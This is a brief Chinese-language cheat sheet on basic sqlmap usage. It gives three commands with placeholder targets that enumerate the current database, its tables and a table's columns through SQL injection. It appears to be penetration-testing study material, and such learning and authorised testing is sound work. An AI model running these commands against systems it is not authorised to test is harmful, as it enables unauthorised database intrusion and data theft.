# sqlmap基础使用

## 爆库名称

```bash
python sqlmap.py -u target_url --current-db
```

## 爆表名称

```bash
python sqlmap.py -u target_url  -D database_name --tables

```

## 爆字段

```

python sqlmap.py -u target_url -D database_name -T table_name --columns
```

